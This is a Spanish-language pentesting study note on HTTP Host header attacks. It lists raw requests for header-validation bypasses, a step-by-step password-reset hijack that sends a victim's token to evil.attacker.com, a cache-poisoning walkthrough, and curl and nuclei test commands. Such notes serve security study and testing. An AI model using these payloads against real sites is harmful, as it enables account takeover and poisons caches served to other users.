---
tags: [web, host-header, password-reset, cache-poisoning]
status: done
---

# HTTP Host Header Attacks

> Manipular la cabecera Host para engañar a la aplicación y explotar lógica que confía en ella.

---

## Por qué funciona

Las aplicaciones usan el Host header para:
- Generar URLs absolutas (links en emails de password reset)
- Cache keying (en proxies)
- Routing entre virtual hosts

Si confían ciegamente en ese header para generar URLs → explotable.

---

## Técnicas de Bypass de Validación

### 1. Suministrar Host Arbitrario

```http
GET / HTTP/1.1
Host: evil.attacker.com
```

### 2. Host con Puerto

```http
GET / HTTP/1.1
Host: legitimate.com:evil.attacker.com
```

### 3. Header Duplicado

```http
GET / HTTP/1.1
Host: legitimate.com
Host: evil.attacker.com
```

Algunos frameworks usan el segundo host si el primero ya fue procesado.

### 4. Line Wrapping

```http
GET / HTTP/1.1
  Host: evil.attacker.com
Host: legitimate.com
```

### 5. Override Headers (los más útiles)

Muchas aplicaciones con proxies delante confían en estos headers:

```http
GET / HTTP/1.1
Host: legitimate.com
X-Forwarded-Host: evil.attacker.com
X-Host: evil.attacker.com
X-Forwarded-Server: evil.attacker.com
X-HTTP-Host-Override: evil.attacker.com
Forwarded: host=evil.attacker.com
```

---

## Password Reset Hijacking

**Escenario:** La aplicación usa el Host header para generar el link de reset de contraseña que se manda por email.

```
1. Iniciar password reset para víctima@target.com
2. Modificar la petición:
   POST /forgot-password HTTP/1.1
   Host: evil.attacker.com           (o X-Forwarded-Host)
   
   email=victim@target.com

3. La app genera:
   "Click aquí: http://evil.attacker.com/reset?token=ABCD1234"
   
4. La víctima hace click → el token llega a nuestro servidor
5. Usamos el token para resetear la contraseña
```

**Burp Suite:** Interceptar la petición de forgot-password y modificar el Host antes de enviar.

---

## Cache Poisoning via Host Header

Si hay un proxy/CDN que cachea basado en la URL pero no en el Host:

```
1. Petición envenenada:
   GET / HTTP/1.1
   Host: evil.attacker.com
   
2. La respuesta se cachea con el link "http://evil.attacker.com/..."
3. Siguiente usuario que pida / sin tocar el Host recibe la respuesta cacheada con nuestro dominio
```

---

## Testing Automatizado

```bash
# Nuclei templates para Host Header
nuclei -t ~/nuclei-templates/vulnerabilities/generic/host-header-injection.yaml -u https://target.com

# Manual con curl
curl -H "Host: evil.attacker.com" https://target.com/forgot-password -d "email=test@test.com" -v
```


---

## Escenarios

| Escenario | Nota |
|-----------|------|
| Metodología de testing | [[07-web-hacking/ataques/http-host-header/metodología\|Metodología]] |
| Técnicas de bypass | [[07-web-hacking/ataques/http-host-header/técnicas\|Técnicas]] |
| Password Reset Flows | [[07-web-hacking/ataques/http-host-header/escenarios/password-reset-flows\|Password Reset Flows]] |
| Auth Bypass via Host Header | [[07-web-hacking/ataques/http-host-header/escenarios/auth-bypass-via-host-header\|Auth Bypass via Host Header]] |
| Accessing Restricted Functions | [[07-web-hacking/ataques/http-host-header/escenarios/accessing-restricted-functions\|Accessing Restricted Functions]] |
| Routing Based SSRF | [[07-web-hacking/ataques/http-host-header/escenarios/routing-based-ssrf\|Routing Based SSRF]] |
| Virtual Host Brute Forcing | [[07-web-hacking/ataques/http-host-header/escenarios/virtual-host-brute-forcing\|Virtual Host Brute Forcing]] |
| Web Cache Poisoning | [[07-web-hacking/ataques/http-host-header/escenarios/web-cache-poisoning\|Web Cache Poisoning]] |
